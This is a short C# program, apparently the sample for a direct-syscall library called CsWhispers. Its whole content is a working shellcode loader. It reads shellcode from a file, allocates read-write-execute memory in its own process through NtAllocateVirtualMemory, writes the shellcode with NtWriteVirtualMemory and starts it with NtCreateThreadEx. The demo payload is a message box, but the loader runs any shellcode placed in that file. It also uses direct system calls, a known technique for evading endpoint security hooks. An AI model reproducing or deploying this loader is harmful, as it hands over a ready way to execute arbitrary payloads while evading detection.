using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;

namespace CsWhispers.Sample;

internal static unsafe class Program
{
    public static void Main(string[] args)
    {
        NTSTATUS status;
        HANDLE hProcess;
        OBJECT_ATTRIBUTES oa;

        // read shellcode
        var shellcode = File.ReadAllBytes(@"C:\Payloads\msgbox.bin");

        // inject into self
        using var self = Process.GetCurrentProcess();

        var cid = new CLIENT_ID
        {
            UniqueProcess = new HANDLE((IntPtr)self.Id)
        };

        status = NtOpenProcess(
            &hProcess,
            PROCESS_ALL_ACCESS,
            &oa,
            &cid);

        // allocate memory
        void* baseAddress;
        var szShellcode = (uint)shellcode.Length;

        status = NtAllocateVirtualMemory(
            hProcess,
            &baseAddress,
            0,
            &szShellcode,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE);

        // write shellcode
        fixed (void* buffer = shellcode)
        {
            status = NtWriteVirtualMemory(
                hProcess,
                baseAddress,
                buffer,
                szShellcode,
                null);
        }

        // create thread
        HANDLE hThread;

        var routine = Marshal.GetDelegateForFunctionPointer<USER_THREAD_START_ROUTINE>((IntPtr)baseAddress);

        status = NtCreateThreadEx(
            &hThread,
            THREAD_ALL_ACCESS,
            null,
            hProcess,
            routine,
            null,
            0,
            0,
            0,
            0,
            null);

        Console.ReadKey();
    }
}